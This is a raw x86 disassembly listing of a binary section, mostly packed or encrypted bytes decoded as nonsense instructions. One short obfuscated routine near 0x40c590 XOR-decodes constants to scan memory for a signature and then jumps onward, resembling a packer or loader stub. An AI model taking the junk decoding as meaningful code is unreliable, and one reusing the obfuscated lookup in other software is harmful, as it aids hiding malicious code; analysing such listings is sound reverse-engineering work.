  40bf69:	popa   
  40bf6a:	mov    ecx,ebx
  40bf6c:	(bad)  
  40bf6d:	lods   al,BYTE PTR ds:[esi]
  40bf6e:	(bad)
  40bf71:	mov    cs,WORD PTR [eax+0x19]
  40bf74:	daa    
  40bf75:	and    al,0xae
  40bf77:	(bad)  
  40bf78:	cli    
  40bf79:	and    al,0x8a
  40bf7b:	aaa    
  40bf7c:	or     BYTE PTR [ebp+0x1a],al
  40bf7f:	das    
  40bf80:	(bad)  
  40bf81:	(bad)  
  40bf83:	icebp  
  40bf84:	dec    esp
  40bf85:	not    BYTE PTR [edx+0x36]
  40bf88:	pop    edi
  40bf89:	jne    0x40bf8e
  40bf8b:	js     0x40bf32
  40bf8d:	cli    
  40bf8e:	mov    ecx,0x6ae98ebc
  40bf93:	bound  ebx,QWORD PTR [ecx+0x77]
  40bf96:	sbb    al,BYTE PTR [ebx]
  40bf98:	mov    ds:0xf879ae88,al
  40bf9d:	jmp    0xd9e2:0x27ab7cd1
  40bfa4:	fnstcw WORD PTR [edi+0x76741f6d]
  40bfaa:	xor    bh,BYTE PTR [edi-0x40]
  40bfad:	xor    cl,0x23
  40bfb0:	enter  0xbe94,0xf2
  40bfb4:	dec    esi
  40bfb5:	mov    edx,0x3fd945fe
  40bfba:	(bad)  
  40bfbb:	loopne 0x40c00c
  40bfbd:	sbb    dh,bh
  40bfbf:	in     eax,0x2f
  40bfc1:	ficomp DWORD PTR [edx+0x6accece6]
  40bfc7:	and    edx,DWORD PTR [ebx+0x2a1075ea]
  40bfcd:	inc    esi
  40bfce:	jg     0x40bf73
  40bfd0:	pop    esp
  40bfd1:	in     al,0x48
  40bfd3:	xor    eax,0x843a696
  40bfd8:	sar    DWORD PTR [esp+eiz*2+0x75],0xfe
  40bfdd:	bound  esi,QWORD PTR es:[ebx]
  40bfe0:	hlt    
  40bfe1:	xlat   BYTE PTR ds:[ebx]
  40bfe2:	push   0xc8accb33
  40bfe7:	push   edi
  40bfe8:	sub    ebx,edi
  40bfea:	mov    al,0xb6
  40bfec:	mov    eax,ds:0x9a112ad4
  40bff1:	push   ebp
  40bff2:	sbb    dl,al
  40bff4:	cmp    eax,0x7fd96c24
  40bff9:	add    al,0x57
  40bffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bffc:	dec    esi
  40bffd:	ret    
  40bffe:	nop
  40bfff:	aam    0xd0
  40c001:	es call 0x6a87:0xe64d03b3
  40c009:	or     eax,0xbf3e469e
  40c00e:	mov    bl,0x8c
  40c010:	xor    dl,BYTE PTR [edi+0x55]
  40c013:	rcl    BYTE PTR [eax-0x13249670],cl
  40c019:	cli    
  40c01a:	in     eax,dx
  40c01b:	sub    BYTE PTR [edx],ah
  40c01d:	or     BYTE PTR ds:0xbf66748d,cl
  40c023:	xchg   BYTE PTR [edx],dh
  40c025:	adc    BYTE PTR [eax],bh
  40c027:	call   0x2712:0xd70f45fd
  40c02e:	sub    esi,0xccae2e8b
  40c034:	or     BYTE PTR ss:[ebx],bl
  40c037:	sub    edi,ebx
  40c039:	fsub   DWORD PTR es:[esi-0x1]
  40c03d:	sbb    ah,BYTE PTR [esi+0x43]
  40c040:	mov    esi,0x40c7f49c
  40c045:	push   esi
  40c046:	or     DWORD PTR [ebp-0x38],ebp
  40c049:	mov    bh,0x3
  40c04b:	mov    edx,DWORD PTR [edx+eax*2]
  40c04e:	inc    edi
  40c04f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c050:	xchg   edi,eax
  40c051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c052:	int3   
  40c053:	gs jbe 0x40c091
  40c056:	call   0x51e4a491
  40c05b:	mov    bl,0xfa
  40c05d:	mov    bh,0x31
  40c060:	daa    
  40c061:	addr16 enter 0x9421,0x4
  40c066:	jno    0x40c0b9
  40c068:	mov    dl,0x2f
  40c06a:	lds    edx,FWORD PTR [edx-0x4]
  40c06d:	iret   
  40c06e:	cmp    al,0xe2
  40c070:	xchg   edi,eax
  40c072:	pop    ss
  40c073:	lods   eax,DWORD PTR ds:[esi]
  40c074:	scas   al,BYTE PTR es:[edi]
  40c075:	mov    edx,0xb1d4d368
  40c07a:	outs   dx,DWORD PTR ds:[esi]
  40c07b:	mov    WORD PTR [eax],ss
  40c07d:	inc    ecx
  40c07e:	jecxz  0x40c0d3
  40c080:	pop    eax
  40c081:	std    
  40c082:	add    BYTE PTR [edi-0x7d],al
  40c085:	fwait
  40c086:	aam    0xc0
  40c088:	jle    0x40c00a
  40c08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c08b:	pop    ecx
  40c08c:	push   es
  40c08d:	popa   
  40c08e:	pop    ebp
  40c08f:	shr    ebx,0x4
  40c092:	(bad)  
  40c093:	stc    
  40c094:	pop    ds
  40c095:	outs   dx,DWORD PTR ds:[esi]
  40c096:	cmp    BYTE PTR [eax-0x6d],0xb4
  40c09a:	cs out dx,al
  40c09c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c09d:	inc    ebp
  40c09e:	mov    eax,0xe023d8f3
  40c0a3:	out    0x9,al
  40c0a5:	int3   
  40c0a6:	and    BYTE PTR [esi-0x25],bl
  40c0a9:	enter  0xe98d,0x5b
  40c0ad:	fdivrp st(4),st
  40c0af:	push   ebp
  40c0b0:	push   ecx
  40c0b1:	sbb    ah,BYTE PTR [edi+0x653532f0]
  40c0b7:	xchg   DWORD PTR ds:0x7af2f4ec,eax
  40c0bd:	mov    edi,0xb2e50b0c
  40c0c2:	cwde   
  40c0c3:	rcl    BYTE PTR [edi-0x5c0c4671],0xc
  40c0ca:	xor    ebx,0xa9de836d
  40c0d0:	(bad)  
  40c0d1:	(bad)  
  40c0d2:	in     al,dx
  40c0d3:	inc    edx
  40c0d4:	outs   dx,BYTE PTR ds:[esi]
  40c0d5:	cli    
  40c0d6:	(bad)  
  40c0d7:	cli    
  40c0d8:	lds    eax,FWORD PTR [ecx-0x1e9bfcb8]
  40c0de:	stos   DWORD PTR es:[edi],eax
  40c0df:	adc    eax,0x4157f435
  40c0e4:	sbb    BYTE PTR [ebx+0x5e63c8b0],bl
  40c0ea:	xchg   ebp,eax
  40c0eb:	(bad)  
  40c0ec:	jge    0x40c112
  40c0ee:	test   BYTE PTR [ebp-0x2e6d0f60],bl
  40c0f4:	std    
  40c0f5:	stos   BYTE PTR es:[edi],al
  40c0f6:	mov    cl,0x21
  40c0f8:	jno    0x40c126
  40c0fa:	push   ebx
  40c0fb:	mov    bh,0x94
  40c0fd:	(bad)  
  40c0fe:	dec    ebp
  40c0ff:	cli    
  40c100:	rol    DWORD PTR [edi],0x53
  40c103:	call   0x2cb3d056
  40c108:	int3   
  40c109:	xchg   edi,esi
  40c10b:	fdiv   QWORD PTR [edi]
  40c10d:	jmp    0xd8cd:0x4813d88c
  40c114:	aam    0xa4
  40c116:	loope  0x40c126
  40c118:	leave  
  40c119:	shr    cl,0xd8
  40c11c:	cmp    esp,esp
  40c11e:	mov    ch,0xc1
  40c120:	out    dx,eax
  40c121:	mov    ds:0xfdcd2bd,al
  40c126:	cmp    ebx,esp
  40c128:	add    DWORD PTR [ecx+0x21],esi
  40c12b:	pop    es
  40c12c:	dec    esi
  40c12d:	pop    ebx
  40c12e:	popf   
  40c12f:	aas    
  40c130:	cmp    eax,0xdf7f5c04
  40c135:	and    ch,BYTE PTR [edx+0xa]
  40c138:	in     eax,dx
  40c139:	inc    esi
  40c13a:	mov    ecx,0xb306ce60
  40c13f:	or     BYTE PTR [ebp+0x63],dl
  40c142:	pop    ebp
  40c143:	push   eax
  40c144:	jno    0x40c183
  40c146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c147:	or     ebp,DWORD PTR [esp+ecx*4]
  40c14a:	and    dh,BYTE PTR [ecx+ecx*2]
  40c14d:	xchg   esi,eax
  40c14e:	xor    al,BYTE PTR [ecx]
  40c150:	sbb    DWORD PTR [esi-0x1e],0xffffffdc
  40c154:	outs   dx,BYTE PTR ds:[esi]
  40c155:	push   edi
  40c156:	and    al,BYTE PTR [ecx+0x53be0fae]
  40c15c:	imul   esp,DWORD PTR [edx+eax*1-0x27173266],0xf848ccb5
  40c167:	loope  0x40c18a
  40c169:	push   0x64c520f7
  40c16e:	mov    bh,BYTE PTR [esp]
  40c171:	push   ebp
  40c172:	pop    ebx
  40c173:	mov    es,WORD PTR [ecx-0x129ea876]
  40c179:	adc    eax,0x86c54598
  40c17e:	sbb    eax,0x67be9e77
  40c184:	push   esi
  40c185:	inc    esi
  40c186:	out    dx,al
  40c187:	sar    BYTE PTR [esi+eax*2+0x5ed1f771],1
  40c18e:	je     0x40c12a
  40c190:	cs out 0xa4,eax
  40c193:	or     bl,ah
  40c195:	adc    eax,0x4d0cbb6f
  40c19a:	push   ss
  40c19b:	fdivr  DWORD PTR [esi+eiz*4-0x22a67a0]
  40c1a2:	cmp    DWORD PTR [ebp-0x4cb8ae85],edi
  40c1a8:	mov    esp,0xc34dad5f
  40c1ad:	or     DWORD PTR [ebp-0x2b],esi
  40c1b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1b1:	xor    al,0xf6
  40c1b3:	push   es
  40c1b4:	test   BYTE PTR [esi+0x13a17421],dl
  40c1ba:	xchg   ebp,eax
  40c1bb:	mov    WORD PTR [ebx-0x404ad058],ds
  40c1c1:	cmp    esi,DWORD PTR [edi-0x6c]
  40c1c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1c5:	(bad)  
  40c1c6:	out    dx,eax
  40c1c7:	call   0x32da28f8
  40c1cc:	out    0x8d,al
  40c1ce:	(bad)  
  40c1cf:	cmp    ebp,edx
  40c1d1:	adc    al,0xdb
  40c1d3:	mov    al,BYTE PTR ds:0xb582f505
  40c1d9:	or     cl,bl
  40c1db:	enter  0x7349,0x75
  40c1df:	clc    
  40c1e0:	(bad)  
  40c1e1:	cmc    
  40c1e2:	and    eax,esi
  40c1e4:	or     eax,0xb2077e56
  40c1e9:	cmp    ch,ch
  40c1eb:	call   0xec0f:0x3e59a71b
  40c1f2:	dec    eax
  40c1f3:	test   DWORD PTR [ecx],eax
  40c1f5:	dec    edi
  40c1f6:	fisubr DWORD PTR [eax-0x4]
  40c1f9:	mov    esp,0x75ece899
  40c1fe:	mov    ecx,0x7af30d78
  40c203:	retf   
  40c204:	fcom   QWORD PTR [edx+0xd]
  40c207:	dec    edx
  40c208:	pop    eax
  40c209:	pop    edx
  40c20a:	(bad)  
  40c20b:	cs retf 0xbc82
  40c20f:	adc    edx,DWORD PTR [ebx+ebx*8]
  40c212:	cs lahf 
  40c214:	ins    DWORD PTR es:[edi],dx
  40c215:	gs out dx,eax
  40c217:	arpl   WORD PTR [ecx-0x1b],sp
  40c21a:	fisttp QWORD PTR [ecx]
  40c21c:	xchg   esi,eax
  40c21d:	les    esi,FWORD PTR [ecx+0x72]
  40c220:	in     eax,dx
  40c221:	fsubrp st(3),st
  40c223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c224:	imul   eax,esi,0x62
  40c227:	and    al,0x88
  40c229:	aas    
  40c22a:	ins    DWORD PTR es:[edi],dx
  40c22b:	pop    si
  40c22d:	rol    DWORD PTR [ebx+eiz*4+0x6f],cl
  40c231:	jns    0x40c25f
  40c233:	xlat   BYTE PTR ds:[ebx]
  40c234:	daa    
  40c235:	int    0x1c
  40c237:	jg     0x40c26b
  40c239:	pop    ecx
  40c23a:	or     DWORD PTR [edi+0x30],ebx
  40c23d:	fxch   st(0)
  40c23f:	add    DWORD PTR [esp+eax*4-0x1ae68595],eax
  40c246:	inc    ebp
  40c247:	fcomi  st,st(4)
  40c249:	sti    
  40c24a:	ss popf 
  40c24c:	out    0x10,al
  40c24e:	stos   DWORD PTR es:[edi],eax
  40c24f:	jne    0x40c1d9
  40c251:	ror    edx,cl
  40c253:	pop    esi
  40c254:	fwait
  40c255:	push   0xffffff9f
  40c257:	push   0x53bcfc11
  40c25c:	(bad)  
  40c25d:	pop    ecx
  40c25e:	mov    edx,0xf9b59077
  40c263:	daa    
  40c264:	jl     0x40c1fb
  40c266:	fisttp WORD PTR [esi]
  40c268:	dec    esi
  40c269:	push   DWORD PTR [ecx+0x1c449e73]
  40c26f:	fild   DWORD PTR [ebx-0x67]
  40c272:	xchg   ebp,eax
  40c273:	jb     0x40c279
  40c275:	enter  0x657a,0x1d
  40c279:	loopne 0x40c21c
  40c27b:	dec    ebp
  40c27c:	mov    bh,0x22
  40c27e:	mov    edx,0x84bd064a
  40c283:	enter  0x18c9,0x3f
  40c287:	pop    edi
  40c288:	jne    0x40c28e
  40c28a:	aam    0xc7
  40c28c:	push   esp
  40c28d:	adc    al,0x1a
  40c28f:	jp     0x40c23f
  40c291:	(bad)  
  40c292:	mov    esi,0xae079c2c
  40c297:	add    al,0x82
  40c299:	out    dx,eax
  40c29a:	jne    0x40c271
  40c29c:	test   BYTE PTR [edi+0x5d4e60fb],0x2b
  40c2a3:	scas   eax,DWORD PTR es:[edi]
  40c2a4:	jne    0x40c259
  40c2a6:	data16 jnp 0x40c247
  40c2a9:	xor    bl,al
  40c2ab:	jb     0x40c2a0
  40c2ad:	jns    0x40c319
  40c2af:	jno    0x40c307
  40c2b1:	add    eax,0x5e236355
  40c2b6:	mov    esi,0x691f5840
  40c2bb:	xor    BYTE PTR [eax],ch
  40c2bd:	frstor [edi]
  40c2bf:	ds dec ebx
  40c2c1:	mov    dh,0x2
  40c2c3:	lods   al,BYTE PTR ds:[esi]
  40c2c4:	sbb    bh,bl
  40c2c6:	adc    DWORD PTR [esi],edx
  40c2c8:	xchg   edx,eax
  40c2c9:	mov    al,BYTE PTR [esp+ebp*4+0x64]
  40c2cd:	add    al,0x15
  40c2cf:	dec    esi
  40c2d0:	dec    esp
  40c2d1:	add    eax,0x981622d8
  40c2d6:	scas   eax,DWORD PTR es:[edi]
  40c2d7:	xor    edi,DWORD PTR [esi+ecx*1]
  40c2da:	aaa    
  40c2db:	popa   
  40c2dc:	test   BYTE PTR [ebp-0x76],0xed
  40c2e0:	xchg   edi,eax
  40c2e1:	xor    al,0x58
  40c2e3:	jle    0x40c2ef
  40c2e5:	call   0xf8aaebd4
  40c2ea:	mov    eax,0x901d7ca6
  40c2ef:	aaa    
  40c2f0:	dec    esi
  40c2f1:	mov    WORD PTR [edi],es
  40c2f3:	outs   dx,DWORD PTR ds:[esi]
  40c2f4:	jae    0x40c359
  40c2f6:	adc    dh,ch
  40c2f8:	adc    al,0x60
  40c2fa:	inc    esi
  40c2fb:	(bad)  
  40c2fd:	adc    bl,BYTE PTR [esi+0x5a99962]
  40c303:	pop    edx
  40c304:	adc    edx,DWORD PTR [ecx-0x44804502]
  40c30a:	daa    
  40c30b:	aam    0x9
  40c30d:	push   0x67
  40c30f:	rcl    bh,0x5e
  40c312:	jbe    0x40c2a3
  40c314:	add    eax,0xa938f4a0
  40c319:	add    eax,eax
  40c31b:	out    0x88,al
  40c31d:	cmp    ch,bh
  40c31f:	std    
  40c320:	xor    dl,BYTE PTR [ebx+0x749b7a1a]
  40c326:	or     dh,BYTE PTR [edi+ebx*1+0x7f]
  40c32a:	push   esi
  40c32b:	loopne 0x40c305
  40c32d:	adc    DWORD PTR [edx-0x32],esi
  40c330:	hlt    
  40c331:	sti    
  40c332:	push   ebx
  40c333:	fsub   QWORD PTR [esi]
  40c335:	jns    0x40c2f8
  40c337:	push   0x52
  40c339:	cmp    eax,0xccfe9848
  40c33e:	mov    cl,0x6c
  40c340:	mov    edi,0x1f71b19f
  40c345:	mov    ah,0xef
  40c347:	pushf  
  40c348:	xchg   BYTE PTR [edi-0x5bad9a4b],dl
  40c34e:	pop    ds
  40c34f:	adc    edx,DWORD PTR [eax+0x79a71811]
  40c355:	dec    ecx
  40c356:	arpl   dx,dx
  40c358:	mov    dh,0xb8
  40c35a:	mov    esi,0x6fd2cc28
  40c35f:	push   0xffffffe2
  40c361:	xor    BYTE PTR [edi],dh
  40c363:	rol    DWORD PTR [ecx-0x52ca7635],1
  40c369:	popa   
  40c36a:	push   ss
  40c36b:	mov    ecx,0xe62f838b
  40c370:	jno    0x40c335
  40c372:	(bad)  
  40c373:	call   FWORD PTR [esp+eiz*8-0x270746b7]
  40c37a:	xchg   edx,eax
  40c37b:	and    al,0xd2
  40c37d:	or     esp,DWORD PTR ds:0xd6d
  40c382:	jb     0x40c33a
  40c384:	pop    ebp
  40c385:	cmp    ch,BYTE PTR ds:0x22f54065
  40c38b:	ret    
  40c38c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c38d:	adc    bl,BYTE PTR [ecx-0x4852c1c1]
  40c393:	call   0xc2f:0x9096ff75
  40c39a:	inc    ecx
  40c39b:	popf   
  40c39c:	jb     0x40c3b2
  40c39e:	mov    bl,0x49
  40c3a0:	imul   ebx,DWORD PTR [edx-0x28399239],0xf3205ac5
  40c3aa:	lods   eax,DWORD PTR ds:[esi]
  40c3ab:	mov    BYTE PTR [ebp+0x4195a0e5],0x52
  40c3b2:	push   ss
  40c3b3:	sub    BYTE PTR [ebp-0x4a],dh
  40c3b6:	hlt    
  40c3b7:	mov    dh,0x34
  40c3b9:	mov    edx,0x87d41095
  40c3be:	jb     0x40c3f4
  40c3c0:	xor    al,0x3a
  40c3c2:	mov    eax,ds:0xbc36789c
  40c3c7:	adc    ecx,edi
  40c3c9:	jns    0x40c3e6
  40c3cb:	jo     0x40c43f
  40c3cd:	cld    
  40c3ce:	xor    esp,ebp
  40c3d0:	sbb    al,0x29
  40c3d2:	push   ss
  40c3d3:	jns    0x40c37c
  40c3d5:	pop    ss
  40c3d6:	mov    eax,DWORD PTR [ebx-0xc]
  40c3d9:	mov    esp,0x9c805c0b
  40c3de:	adc    al,0xc8
  40c3e0:	sub    dh,BYTE PTR [edx]
  40c3e2:	cld    
  40c3e3:	pop    ss
  40c3e4:	popa   
  40c3e5:	mov    ah,0x36
  40c3e7:	jb     0x40c3ed
  40c3e9:	hlt    
  40c3ea:	adc    al,BYTE PTR [ecx+0x25]
  40c3ed:	aaa    
  40c3ee:	mov    bh,0x15
  40c3f0:	cmp    DWORD PTR [eax+edi*2-0x627a0378],0x389c6ab4
  40c3fb:	jb     0x40c3a4
  40c3fd:	pusha  
  40c3fe:	jg     0x40c417
  40c400:	mov    edx,0xf732675e
  40c405:	pop    ebx
  40c406:	je     0x40c3cf
  40c408:	mov    esp,0x2017be20
  40c40d:	dec    esi
  40c40e:	sub    eax,0x6427c4c1
  40c413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c414:	xchg   edx,eax
  40c415:	nop
  40c416:	out    0xd5,eax
  40c418:	outs   dx,DWORD PTR ds:[esi]
  40c419:	dec    edi
  40c41a:	stos   DWORD PTR es:[edi],eax
  40c41b:	out    dx,eax
  40c41c:	cmc    
  40c41d:	rcl    ebx,0x66
  40c420:	imul   esp,ebx,0x35491fbc
  40c426:	enter  0xed15,0x7b
  40c42a:	and    esp,DWORD PTR [edx+ecx*4-0x1a7d4417]
  40c431:	and    ecx,DWORD PTR [edx]
  40c433:	adc    esp,DWORD PTR [ebp-0x3d]
  40c436:	xchg   ecx,eax
  40c437:	or     eax,0x4bc6e2d6
  40c43c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c43d:	or     ebx,DWORD PTR [edi+ebp*1-0x6431cb21]
  40c444:	push   es
  40c445:	fwait
  40c446:	sbb    eax,DWORD PTR [esi-0x1d]
  40c449:	retf   
  40c44a:	dec    edx
  40c44b:	xchg   edx,eax
  40c44c:	pusha  
  40c44d:	cmp    BYTE PTR [eax-0x30],dh
  40c450:	imul   ebp,DWORD PTR [edi-0x60],0xe1816a10
  40c457:	or     eax,0xb80d9941
  40c45c:	cld    
  40c45d:	sbb    bl,BYTE PTR [edi-0x5c]
  40c460:	mov    ds:0xfb7cf98a,al
  40c465:	icebp  
  40c466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c467:	rol    dl,cl
  40c469:	mov    DWORD PTR [ebp-0x20c98aab],esp
  40c46f:	je     0x40c4ae
  40c471:	cmp    BYTE PTR [esi],bl
  40c473:	pop    es
  40c474:	cwde   
  40c475:	es sub eax,0xf1e46019
  40c47b:	jg     0x40c406
  40c47d:	mov    edx,DWORD PTR [ecx+eiz*1]
  40c480:	lahf   
  40c481:	jmp    0x40c44f
  40c483:	fstp   QWORD PTR [ebx+edi*2]
  40c486:	fucomi st,st(0)
  40c488:	mov    ah,0x86
  40c48a:	mov    dh,0x51
  40c48c:	ror    DWORD PTR [esi+0x608e8649],1
  40c492:	push   es
  40c493:	cmp    ecx,DWORD PTR [eax-0x16]
  40c496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c497:	in     eax,dx
  40c498:	mov    dh,0xa
  40c49a:	pop    es
  40c49b:	pop    edx
  40c49c:	ins    DWORD PTR es:[edi],dx
  40c49d:	gs mov eax,0xcf6e18af
  40c4a3:	jmp    0x79e7:0x41f0848c
  40c4aa:	mov    eax,0xbf8ce63c
  40c4b0:	or     cl,dl
  40c4b2:	mov    dl,0xec
  40c4b4:	cld    
  40c4b5:	pop    ss
  40c4b6:	cmp    BYTE PTR [bx+di],ah
  40c4b9:	stc    
  40c4ba:	inc    esp
  40c4bb:	lahf   
  40c4bc:	mov    ds:0xca5635f8,al
  40c4c1:	div    cl
  40c4c3:	push   ebp
  40c4c4:	jne    0x40c474
  40c4c6:	pop    esi
  40c4c7:	inc    edi
  40c4c8:	xchg   DWORD PTR [esi+0x3e117fd2],edi
  40c4ce:	xor    eax,0x6d70d4fe
  40c4d3:	pop    ss
  40c4d4:	ror    DWORD PTR [ebx+0x6e6835af],cl
  40c4da:	adc    DWORD PTR [ebx-0x26d8568c],edi
  40c4e0:	pop    ecx
  40c4e1:	pop    ds
  40c4e2:	(bad)  
  40c4e3:	bound  esp,QWORD PTR [ebx]
  40c4e5:	loop   0x40c543
  40c4e7:	test   eax,0xda6758e
  40c4ec:	sub    eax,edi
  40c4ee:	cs mov esp,0xdb1725e6
  40c4f4:	pop    es
  40c4f5:	push   ss
  40c4f6:	lods   eax,DWORD PTR ds:[esi]
  40c4f7:	dec    eax
  40c4f8:	shr    DWORD PTR [eax-0x5f],1
  40c4fb:	jbe    0x40c491
  40c4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4fe:	out    0xb3,eax
  40c500:	mov    esp,0xe8ef4cd0
  40c505:	jno    0x40c554
  40c507:	icebp  
  40c508:	sub    ecx,DWORD PTR [bx+si+0x3e]
  40c50c:	sub    eax,0x67719074
  40c511:	fcomp  QWORD PTR [eax+ebp*8]
  40c514:	xor    DWORD PTR [ebx-0x5],edx
  40c517:	retf   
  40c518:	pushf  
  40c519:	popa   
  40c51a:	jo     0x40c53f
  40c51c:	pop    edi
  40c51d:	loopne 0x40c4c7
  40c51f:	stos   DWORD PTR es:[edi],eax
  40c520:	std    
  40c521:	das    
  40c522:	add    bl,al
  40c524:	stos   DWORD PTR es:[edi],eax
  40c525:	push   ebx
  40c526:	(bad)  
  40c527:	dec    esi
  40c528:	adc    eax,0x35afb6ef
  40c52d:	sub    al,0xa7
  40c52f:	xchg   DWORD PTR [esp+esi*2],ecx
  40c532:	ret    
  40c533:	adc    edx,DWORD PTR ds:0x40ba8b6b
  40c539:	int    0x78
  40c53b:	inc    esp
  40c53c:	fidiv  DWORD PTR [edx-0x75]
  40c53f:	(bad)  
  40c540:	scas   al,BYTE PTR es:[edi]
  40c541:	sub    esp,eax
  40c543:	stos   BYTE PTR es:[edi],al
  40c544:	in     al,0xb3
  40c546:	loop   0x40c542
  40c548:	sbb    BYTE PTR [ebx-0x5f],dl
  40c54b:	repz fwait
  40c54d:	mov    ds:0x6f18dfe1,eax
  40c552:	jae    0x40c54e
  40c554:	lock xor al,0x20
  40c557:	sbb    ebp,DWORD PTR [esi-0x4b]
  40c55a:	inc    ecx
  40c55b:	pushf  
  40c55c:	fiadd  WORD PTR [edi]
  40c55e:	ret    0x6129
  40c561:	mov    DWORD PTR [ebx],esi
  40c563:	add    al,BYTE PTR [ebp+0x6b]
  40c566:	out    dx,al
  40c567:	ret    
  40c568:	test   eax,0x76c68907
  40c56d:	lock xor BYTE PTR [edi-0x36],al
  40c571:	jmp    0x40c55c
  40c573:	fimul  WORD PTR [edi+ebx*8]
  40c576:	xor    DWORD PTR gs:[edi],esp
  40c579:	stos   DWORD PTR es:[edi],eax
  40c57a:	jns    0x40c5b6
  40c57c:	ficom  WORD PTR [edx*8+0x6cb10a4e]
  40c583:	jmp    0x40c5fb
  40c585:	retf   
  40c586:	rcr    edi,0xe9
  40c589:	nop
  40c58a:	iret   
  40c58b:	mov    edx,0x38031386
  40c590:	mov    DWORD PTR [ebp-0x8],edi
  40c593:	mov    eax,DWORD PTR [ebp+0xc]
  40c596:	mov    edi,DWORD PTR [ebp+0xc]
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0x644b873c
  40c65b:	mov    bh,BYTE PTR [esi+0x7ce0a269]
  40c661:	jl     0x40c6b1
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	call   0xece521a1
  40c66b:	jae    0x40c6c5
  40c66d:	and    BYTE PTR [ebx],dh
  40c66f:	dec    ebx
  40c670:	retf   0xa839
  40c673:	pop    ds
  40c674:	xchg   DWORD PTR [esi-0x38],edi
  40c677:	retf   0x936d
  40c67a:	sub    al,0x40
  40c67c:	add    al,0x4f
  40c67e:	xchg   si,ax
  40c680:	push   0xffffffa9
  40c682:	ja     0x40c64e
  40c684:	or     al,0xda
  40c686:	add    eax,0x13bc6713
  40c68b:	jl     0x40c637
  40c68d:	ins    BYTE PTR es:[edi],dx
  40c68e:	cmp    bh,ch
  40c690:	jmp    0xc912:0x1dee2dbd
  40c697:	mov    ecx,0x497f3c74
  40c69c:	int    0xab
  40c69e:	mov    ds:0x585e092f,al
  40c6a3:	cmp    DWORD PTR [edx+esi*1],ebp
  40c6a6:	fwait
  40c6a7:	jmp    0x9875d435
  40c6ac:	push   0x22a90aef
  40c6b1:	pop    ebp
  40c6b2:	stc    
  40c6b3:	push   edx
  40c6b4:	xor    al,0xaf
  40c6b6:	stc    
  40c6b7:	and    al,ah
  40c6b9:	(bad)  
  40c6ba:	fcmovu st,st(4)
  40c6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6bd:	cld    
  40c6be:	jae    0x40c6f4
  40c6c0:	je     0x40c675
  40c6c2:	adc    eax,0x871b8b69
  40c6c7:	xor    eax,0x2131823d
  40c6cc:	(bad)  
  40c6cd:	lds    ebp,FWORD PTR [ecx+ecx*4]
  40c6d0:	push   ss
  40c6d1:	pop    ebp
  40c6d2:	mov    ds,esi
  40c6d4:	outs   dx,DWORD PTR ds:[esi]
  40c6d5:	fwait
  40c6d6:	dec    edx
  40c6d7:	mov    eax,ds:0x4b9dfd99
  40c6dc:	mov    esi,0xf7e8a9f1
  40c6e1:	popf   
  40c6e2:	cmp    eax,0xc51eb00e
  40c6e7:	popa   
  40c6e8:	repnz loopne 0x40c75d
  40c6eb:	sbb    eax,0x49031ee3
  40c6f0:	loop   0x40c6e5
  40c6f2:	les    esp,FWORD PTR [edi]
  40c6f4:	iret   
  40c6f5:	cmp    eax,0x730e9ed5
